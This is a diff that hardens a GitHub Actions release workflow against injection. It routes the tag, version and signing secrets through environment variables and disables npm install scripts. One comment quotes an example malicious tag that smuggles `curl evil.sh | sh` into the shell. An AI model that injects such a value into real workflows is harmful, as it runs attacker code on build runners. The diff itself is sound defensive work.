@@ -23,9 +23,14 @@ jobs:
     steps:
       - name: Resolve tag
         id: resolve
+        # INPUT_TAG is caller-controlled, so it goes through the environment
+        # rather than being interpolated into the script body, where a tag like
+        # `v1"; curl evil.sh | sh; #` would execute (githubactions:S7630).
+        env:
+          INPUT_TAG: ${{ inputs.tag }}
         run: |
-          if [ -n "${{ inputs.tag }}" ]; then
-            TAG="${{ inputs.tag }}"
+          if [ -n "$INPUT_TAG" ]; then
+            TAG="$INPUT_TAG"
           else
             TAG="${GITHUB_REF#refs/tags/}"
           fi
@@ -37,11 +42,16 @@ jobs:
         with:
           ref: ${{ steps.resolve.outputs.tag }}
 
+      # VERSION derives from INPUT_TAG, so it carries the same taint and goes
+      # through the environment too — `${{ }}` is substituted into the YAML
+      # before the shell parses it (githubactions:S7630).
       - name: Validate version in info.xml matches tag
+        env:
+          VERSION: ${{ steps.resolve.outputs.version }}
         run: |
           INFO_VERSION=$(sed -n 's/.*<version>\(.*\)<\/version>.*/\1/p' appinfo/info.xml | tr -d '\t')
-          if [ "$INFO_VERSION" != "${{ steps.resolve.outputs.version }}" ]; then
-            echo "Version mismatch: info.xml has $INFO_VERSION but tag is ${{ steps.resolve.outputs.version }}"
+          if [ "$INFO_VERSION" != "$VERSION" ]; then
+            echo "Version mismatch: info.xml has $INFO_VERSION but tag is $VERSION"
             exit 1
           fi
           echo "Version validated: $INFO_VERSION"
@@ -74,21 +84,32 @@ jobs:
       - name: Install dependencies and build
         run: |
           composer install --no-dev --optimize-autoloader
-          npm ci
+          npm ci --ignore-scripts
           npm run build
 
+      # The key/cert reach the script through the environment rather than being
+      # expanded into the `run:` body, where they would end up in the rendered
+      # command line (githubactions:S7636).
       - name: Setup signing certificate
+        env:
+          APP_PRIVATE_KEY: ${{ secrets.APP_PRIVATE_KEY }}
+          APP_PUBLIC_CRT: ${{ secrets.APP_PUBLIC_CRT }}
         run: |
-          mkdir -p $HOME/.nextcloud/certificates
-          echo "${{ secrets.APP_PRIVATE_KEY }}" > $HOME/.nextcloud/certificates/${{ env.APP_NAME }}.key
-          echo "${{ secrets.APP_PUBLIC_CRT }}" > $HOME/.nextcloud/certificates/${{ env.APP_NAME }}.crt
+          mkdir -p "$HOME/.nextcloud/certificates"
+          printf '%s\n' "$APP_PRIVATE_KEY" > "$HOME/.nextcloud/certificates/${APP_NAME}.key"
+          printf '%s\n' "$APP_PUBLIC_CRT" > "$HOME/.nextcloud/certificates/${APP_NAME}.crt"
 
       - name: Extract changelog for this version
         id: changelog
+        # Same reasoning as the validation step above: VERSION goes through the
+        # environment (githubactions:S7630). It also reaches awk via `-v` rather
+        # than being spliced into the program text, which removes both the
+        # regex-escaping dance and awk-program injection as a second surface.
+        env:
+          VERSION: ${{ steps.resolve.outputs.version }}
         run: |
-          version="${{ steps.resolve.outputs.version }}"
           # Extract content between this version's header and the next version header
-          body=$(awk "/^## v${version//./\\.} /{found=1; next} /^## v[0-9]/{if(found) exit} found{print}" CHANGELOG.md)
+          body=$(awk -v ver="$VERSION" 'index($0, "## v" ver " ") == 1 {found=1; next} /^## v[0-9]/{if(found) exit} found{print}' CHANGELOG.md)
           # Use GH delimiter for multiline output
           {
             echo "body<<CHANGELOG_EOF"
